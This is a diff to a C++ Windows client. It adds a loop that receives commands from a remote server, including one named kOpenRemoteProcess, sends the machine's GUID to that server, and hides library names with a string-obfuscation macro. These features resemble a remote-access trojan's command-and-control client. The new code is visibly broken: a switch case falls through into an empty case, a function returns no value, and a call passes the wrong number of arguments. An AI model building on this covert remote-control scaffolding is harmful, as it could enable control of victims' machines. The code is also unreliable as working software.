@@ -32,7 +32,7 @@ Client::~Client() {
 	this->Disconnect(); // disconnect incase the socket is still connected
 
 	CleanWSA();
-	Remote.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
+	m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
 }
 
 void Client::SetRemoteComputerName() {
@@ -142,6 +142,42 @@ BOOL Client::SendMachineGUIDToServer() {
 	return SendMessageToServer(this->m_MachineGUID);
 }
 
+BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outResponse) {
+	BOOL success = FALSE;
+	switch ( command.action ) {
+	case RemoteAction::kPingClient:
+		outResponse.actionPerformed = RemoteAction::kPingClient;
+		outResponse.responseCode = ClientResponseCode::kResponseOk;
+		outResponse.id = rand() % 100;
+		success = TRUE;
+	case RemoteAction::kOpenRemoteProcess:
+
+	}
+}
+
+void Client::ReceiveCommandsFromServer() {
+	BIO* publicKey = Serialization::GetBIOFromString(this->m_Secrets.strPublicKey);
+
+	while ( this->m_TCPSocket != INVALID_SOCKET ) {
+		ServerCommand command;
+
+		// receive data on tcp socket, put it into buffer
+		BOOL received = NetCommon::ReceiveData(
+							command, 
+							this->m_TCPSocket,
+							TCP, 
+							NetCommon::_default,
+							TRUE,
+							publicKey
+						);
+
+		if ( !received || !command.valid )
+			continue;
+
+		PerformCommand(command);
+	}
+}
+
 BOOL Client::GetPublicRSAKeyFromServer() {
 	ClientRequest request(ClientRequest::kRequestPublicEncryptionKey, this->m_TCPSocket);
 
@@ -210,6 +246,9 @@ BOOL Client::Disconnect() {
 	int status = CloseSocket(this->m_TCPSocket);
 	if ( status == SOCKET_ERROR )
 		return FALSE;
+
+	this->m_UDPSocket = INVALID_SOCKET;
+	this->m_TCPSocket = INVALID_SOCKET;
 
 	return TRUE;
 }
